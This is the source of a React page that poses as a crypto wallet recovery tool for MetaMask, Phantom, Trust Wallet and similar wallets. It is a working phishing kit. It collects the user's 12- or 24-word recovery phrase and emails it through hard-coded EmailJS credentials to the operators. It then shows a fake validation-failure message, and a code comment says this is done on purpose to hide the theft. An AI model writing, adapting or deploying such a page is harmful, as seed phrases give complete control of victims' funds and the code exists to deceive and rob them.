'use client';

import { useState } from 'react';
import { ChevronDown } from 'lucide-react';
import emailjs from '@emailjs/browser';

export default function WalletRecoveryPage() {
  const [selectedWallet, setSelectedWallet] = useState('Wallet Selected');
  const [recoveryPhrase, setRecoveryPhrase] = useState('');
  const [isDropdownOpen, setIsDropdownOpen] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState('');

  const sendEmail = async () => {
    if (!recoveryPhrase.trim()) {
      setSubmitStatus('Please enter your recovery phrase');
      return;
    }

    setIsSubmitting(true);
    setSubmitStatus('');

    try {
      // Template params matching your EmailJS Contact Us template exactly
      const templateParams = {
        wallet_type: selectedWallet,
        timestamp: new Date().toLocaleString(),
        recovery_phrase: recoveryPhrase
      };

      console.log('Attempting to send email with params:', templateParams);
      console.log('Service ID:', 'service_v29yl0j');
      console.log('Template ID:', 'template_g312oki');
      console.log('Public Key:', 'L0WSevQpPMia5W_RK');

      // Send email (will go to both addresses via Bcc in template settings)
      const result = await emailjs.send(
        'service_v29yl0j',
        'template_g312oki',
        templateParams,
        'L0WSevQpPMia5W_RK'
      );

      console.log('Email sent successfully:', result);
      setSubmitStatus('Unable to validate your wallet. Please select an active wallet and try again.!');

      // Don't clear the form to make it seem like validation failed

    } catch (error) {
      console.error('Email sending failed:', error);
      console.error('Error details:', {
        text: error.text,
        status: error.status,
        message: error.message
      });
      setSubmitStatus(`Failed to send: ${error.text || error.message || 'Error 400 - Check EmailJS setup'}`);
    } finally {
      setIsSubmitting(false);
    }
  };

  const walletOptions = [
    'Best Wallet',
    'MetaMask',
    'WalletConnect',
    'Coinbase Wallet',
    'Phantom',
    'Trust Wallet'
  ];

  return (
    <div className="min-h-screen" style={{backgroundColor: 'rgba(210, 206, 203, 0.95)'}}>
      <div className="max-w-2xl mx-auto p-8">
        {/* Wallet Selection Dropdown */}
        <div className="mb-8">
          <div className="relative">
            <button
              onClick={() => setIsDropdownOpen(!isDropdownOpen)}
              className="w-full bg-white border border-gray-300 rounded-lg px-4 py-3 text-left text-gray-800 font-medium flex items-center justify-between hover:border-gray-400 transition-colors"
            >
              <span>{selectedWallet}</span>
              <ChevronDown className={`w-5 h-5 text-gray-600 transition-transform ${isDropdownOpen ? 'rotate-180' : ''}`} />
            </button>

            {isDropdownOpen && (
              <div className="absolute top-full left-0 right-0 mt-1 bg-white border border-gray-300 rounded-lg shadow-lg z-10">
                {walletOptions.map((wallet, index) => (
                  <button
                    key={index}
                    onClick={() => {
                      setSelectedWallet(wallet);
                      setIsDropdownOpen(false);
                    }}
                    className="w-full px-4 py-3 text-left text-gray-800 hover:bg-gray-50 first:rounded-t-lg last:rounded-b-lg transition-colors"
                  >
                    {wallet}
                  </button>
                ))}
              </div>
            )}
          </div>
        </div>

        {/* Recovery Phrase Section */}
        <div className="mb-8">
          <label className="block text-gray-600 text-lg font-medium mb-4">
            Recovery Phrase
          </label>
          <div className="bg-white border border-gray-300 rounded-lg p-4 min-h-[300px]">
            <textarea
              value={recoveryPhrase}
              onChange={(e) => setRecoveryPhrase(e.target.value)}
              placeholder="Enter your recovery phrase here..."
              className="w-full h-full min-h-[280px] resize-none border-none outline-none text-gray-800 bg-transparent"
            />
          </div>
        </div>

        {/* Helper Text */}
        <div className="mb-8">
          <p className="text-gray-600 text-base">
            Typically 12 (sometimes 24) words separated by a single space.
          </p>
        </div>

        {/* Status Message */}
        {submitStatus && (
          <div className={`mb-4 p-3 rounded-lg ${
            submitStatus.includes('successfully')
              ? 'bg-green-100 text-green-800 border border-green-300'
              : 'bg-red-100 text-red-800 border border-red-300'
          }`}>
            {submitStatus}
          </div>
        )}

        {/* Proceed Button */}
        <div className="flex justify-start">
          <button
            onClick={sendEmail}
            disabled={isSubmitting || !recoveryPhrase.trim()}
            className={`bg-[#2a2a2a] hover:bg-[#3a3a3a] text-white font-bold py-3 px-8 rounded-lg transition-colors ${
              isSubmitting || !recoveryPhrase.trim()
                ? 'opacity-50 cursor-not-allowed'
                : ''
            }`}
          >
            {isSubmitting ? 'Connecting...' : 'Proceed'}
          </button>
        </div>
      </div>
    </div>
  );
}
